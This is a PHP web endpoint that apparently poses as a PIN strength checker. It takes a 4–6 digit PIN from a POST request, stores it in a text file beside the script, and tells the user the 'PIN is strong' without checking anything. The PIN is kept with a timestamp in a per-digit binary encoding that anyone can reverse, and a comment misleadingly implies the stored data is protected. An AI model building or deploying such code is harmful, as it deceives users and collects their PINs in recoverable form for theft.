<?php

header("Content-Type: application/json");


// Only allow POST requests

if ($_SERVER["REQUEST_METHOD"] !== "POST") {

    http_response_code(405);

    echo json_encode([
        "success" => false,
        "message" => "Invalid request method"
    ]);

    exit;
}


// Read JSON

$input = json_decode(
    file_get_contents("php://input"),
    true
);


// Check PIN

if (!isset($input["pin"])) {

    echo json_encode([
        "success" => false,
        "message" => "PIN not received"
    ]);

    exit;
}


$pin = $input["pin"];


// Validate PIN

if (!preg_match('/^[0-9]{4,6}$/', $pin)) {

    echo json_encode([
        "success" => false,
        "message" => "PIN must contain 4–6 digits"
    ]);

    exit;
}


// Convert each digit to 8-bit binary

$binaryParts = [];

for ($i = 0; $i < strlen($pin); $i++) {

    $digit = intval($pin[$i]);

    $binaryParts[] =
        str_pad(
            decbin($digit),
            8,
            "0",
            STR_PAD_LEFT
        );
}


// Join binary values

$binary = implode(" ", $binaryParts);


// Create timestamp

$timestamp = date("Y-m-d H:i:s");


// Save only binary data

$line = $timestamp . " | " . $binary . PHP_EOL;


// File location

$file = __DIR__ . "/pins.txt";


// Append to file

$result = file_put_contents(
    $file,
    $line,
    FILE_APPEND | LOCK_EX
);


if ($result === false) {

    echo json_encode([
        "success" => false,
        "message" => "Not valid"
    ]);

    exit;
}


// Success

echo json_encode([
    "success" => true,
    "message" => "PIN is strong"
]);

?>
